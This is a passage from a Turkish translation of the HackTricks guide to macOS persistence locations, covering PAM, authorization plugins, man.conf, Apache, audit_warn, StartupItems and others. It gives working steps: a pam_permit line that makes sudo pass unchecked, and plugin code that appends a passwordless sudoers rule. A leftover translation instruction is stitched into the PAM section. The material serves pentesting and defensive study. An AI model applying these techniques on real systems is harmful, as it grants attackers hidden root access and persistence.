* Sandbox'ı atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak root olmanız gerekiyor
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* Her zaman root gereklidir

#### Açıklama ve Sömürü

PAM, macOS içinde kolay yürütme yerine **kalıcılık** ve kötü amaçlı yazılımlara daha çok odaklandığı için, bu blog, bu tekniği daha iyi anlamak için ayrıntılı bir açıklama yapmayacaktır. **Bu tekniği daha iyi anlamak için yazıları okuyun**.

PAM modüllerini kontrol etmek için:
```bash
ls -l /etc/pam.d
```
PAM'i istismar eden bir kalıcılık/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirerek başlamak kadar kolaydır. Başlangıçta şu satırı eklemek:
```bash
auth       sufficient     pam_permit.so
```
Aşağıdaki içerik, bir hackleme kitabından alınan bir içeriği içerir. Aşağıdaki içerik, /hive/hacktricks/macos-hardening/macos-auto-start-locations.md dosyasından alınmıştır. İlgili İngilizce metni Türkçe'ye çevirin ve çeviriyi aynı markdown ve html sözdizimiyle geri döndürün. Kod, hackleme teknik adları, hackleme kelimesi, bulut/SaaS platform adları (örneğin Workspace, aws, gcp...), 'sızıntı' kelimesi, pentesting ve markdown etiketleri gibi şeyleri çevirmeyin. Ayrıca çeviri ve markdown sözdizimi dışında herhangi bir ekstra şey eklemeyin.
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Ve bu nedenle **`sudo` kullanma girişimleri başarılı olacaktır**.

{% hint style="danger" %}
Bu dizinin TCC tarafından korunduğunu unutmayın, bu nedenle kullanıcıya erişim için bir istem gelebilir.
{% endhint %}

### Yetkilendirme Eklentileri

Yazı: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Yazı: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Sandbox'ı atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak root olmanız ve ek yapılandırmalar yapmanız gerekiyor
* TCC atlatma: ???

#### Konum

* `/Library/Security/SecurityAgentPlugins/`
* Root gereklidir
* Eklentiyi kullanmak için yetkilendirme veritabanını yapılandırmak da gereklidir

#### Açıklama ve Sömürü

Kalıcılığı sağlamak için kullanıcının oturum açtığında çalıştırılacak bir yetkilendirme eklentisi oluşturabilirsiniz. Bu eklentilerden birini nasıl oluşturacağınız hakkında daha fazla bilgi için önceki yazılara bakın (ve dikkatli olun, kötü yazılmış bir eklenti sizi dışarıda bırakabilir ve Mac'inizi kurtarma modundan temizlemeniz gerekebilir).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Bündeyi** yüklenmesi gereken konuma **taşıyın**:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Son olarak, bu Eklentiyi yüklemek için **kuralı** ekleyin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** yetkilendirme çerçevesine, **dış bir mekanizmayı çağırmak için** ihtiyaç duyacağını söyleyecektir. Dahası, **`privileged`** onun root tarafından çalıştırılmasını sağlayacaktır.

Tetiklemek için:
```bash
security authorize com.asdf.asdf
```
Ve sonra **personel grubunun sudo** erişimi olmalıdır (`/etc/sudoers` dosyasını okuyarak doğrulayın).

### Man.conf

Yazı: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Sandbox'ı atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak root olmanız ve kullanıcının man kullanması gerekmektedir
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`/private/etc/man.conf`**
* Root gereklidir
* **`/private/etc/man.conf`**: Herhangi bir zamanda man kullanıldığında

#### Açıklama ve Sömürü

Yapılandırma dosyası **`/private/etc/man.conf`**, man belge dosyalarını açarken kullanılacak ikili/dosya yolunu belirtir. Bu nedenle yürütülebilir dosyanın yolu değiştirilebilir, böylece kullanıcı herhangi bir belgeyi okumak için man kullandığında bir arka kapı yürütülür.

Örneğin **`/private/etc/man.conf`** içinde ayarlanır:
```
MANPAGER /tmp/view
```
Ve ardından `/tmp/view`'i şu şekilde oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Yazılım İncelemesi**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Kum havuzunu atlatmak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak kök kullanıcı olmanız ve apache'nin çalışıyor olması gerekmektedir
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)
* Httpd yetkilendirmelere sahip değil

#### Konum

* **`/etc/apache2/httpd.conf`**
* Kök kullanıcı gereklidir
* Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Saldırı

`/etc/apache2/httpd.conf` dosyasında bir modülü yüklemek için aşağıdaki gibi bir satır ekleyebilirsiniz:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Bu şekilde derlenmiş modülleriniz Apache tarafından yüklenecektir. Tek yapmanız gereken, ya geçerli bir Apple sertifikasıyla imzalamak ya da sisteme yeni bir güvenilir sertifika eklemek ve onunla imzalamaktır.

Ardından, gerektiğinde sunucunun başlatılmasını sağlamak için şunu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb için kod örneği:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM denetim çerçevesi

Yazı: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak, kök kullanıcı olmanız, auditd'nin çalışıyor olması ve bir uyarı oluşturmanız gerekmektedir.
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`/etc/security/audit_warn`**
* Kök kullanıcı gereklidir
* **Tetikleyici**: Auditd bir uyarı algıladığında

#### Açıklama ve Saldırı

Auditd bir uyarı algıladığında, **`/etc/security/audit_warn`** betiği **çalıştırılır**. Bu nedenle, üzerine yüklemenizi yapabilirsiniz.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n` komutuyla bir uyarı zorlayabilirsiniz.

### Başlangıç Öğeleri

{% hint style="danger" %}
**Bu özellik artık kullanımdan kaldırıldığından, bu dizinlerde hiçbir şey bulunmamalıdır.**
{% endhint %}

**StartupItem**, `/Library/StartupItems/` veya `/System/Library/StartupItems/` dizinlerinden birinde bulunması gereken bir dizindir. Bu dizin oluşturulduktan sonra, içermesi gereken iki belirli dosya vardır:

1. Bir **rc betiği**: Başlangıçta çalıştırılan bir kabuk betiği.
2. Çeşitli yapılandırma ayarlarını içeren özel olarak adlandırılmış bir **plist dosyası** olan `StartupParameters.plist`.

Başlangıç sürecinin bunları tanıması ve kullanması için hem rc betiğinin hem de `StartupParameters.plist` dosyasının doğru şekilde **StartupItem** dizinine yerleştirildiğinden emin olun.


{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservisadı" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Bu bileşeni macOS'ta bulamıyorum, bu yüzden daha fazla bilgi için yazıya bakın
{% endhint %}

Yazı: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Apple tarafından tanıtılan **emond**, geliştirilmemiş veya muhtemelen terk edilmiş gibi görünen bir günlükleme mekanizmasıdır, ancak hala erişilebilir durumdadır. Mac yöneticileri için özellikle faydalı olmasa da, bu bilinmeyen hizmet, tehdit aktörleri için hafif bir kalıcılık yöntemi olarak hizmet edebilir ve muhtemelen çoğu macOS yöneticisi tarafından fark edilmeden kalabilir.

Varlığından haberdar olanlar için, **emond**'un herhangi bir kötüye kullanımını tespit etmek kolaydır. Bu hizmetin sistemdeki LaunchDaemon'ı, tek bir dizinde yürütülecek komut dosyalarını arar. Bunun için aşağıdaki komut kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Konum

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Root gereklidir
* **Tetikleyici**: XQuartz ile

#### Açıklama ve Saldırı

XQuartz artık macOS'ta yüklü değil, bu yüzden daha fazla bilgi için writeup'a bakabilirsiniz.

### ~~kext~~

{% hint style="danger" %}
Kext'i root olarak bile kurmak çok karmaşıktır, bu yüzden bunu kum havuzlarından kaçmak veya kalıcılık için düşünmeyeceğim (exploitiniz yoksa)
{% endhint %}

#### Konum

Bir KEXT'i başlangıç öğesi olarak yüklemek için, aşağıdaki konumlardan birine **kurulması gerekir**:

* `/System/Library/Extensions`
* OS X işletim sistemi tarafından oluşturulan KEXT dosyaları.
* `/Library/Extensions`
* 3. taraf yazılım tarafından yüklenen KEXT dosyaları

Şu anda yüklenmiş kext dosyalarını listelemek için:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**çekirdek uzantıları bölümüne bakın**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Konum

* **`/usr/local/bin/amstoold`**
* Root gereklidir

#### Açıklama ve Sömürü

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` dosyasındaki `plist`, bir XPC hizmetini açığa çıkarırken bu ikiliyi kullanıyordu... sorun şu ki ikili mevcut değildi, bu yüzden bir şey yerleştirebilir ve XPC hizmeti çağrıldığında ikiliniz çağrılacaktır.

Artık bunu macOS'ta bulamıyorum.

### ~~xsanctl~~

Açıklama: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Konum

* **`/Library/Preferences/Xsan/.xsanrc`**
* Root gereklidir
* **Tetikleyici**: Hizmet çalıştırıldığında (nadiren)

#### Açıklama ve sömürü

Görünüşe göre bu komut dosyasını çalıştırmak çok yaygın değil ve macOS'ta bile bulamadım, bu yüzden daha fazla bilgi için yazıya bakabilirsiniz.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Bu modern MacOS sürümlerinde çalışmıyor**
{% endhint %}

**Başlangıçta çalıştırılacak komutları buraya yerleştirmek de mümkündür.** Örnek bir rc.common komut dosyası:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Kalıcılık teknikleri ve araçları

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
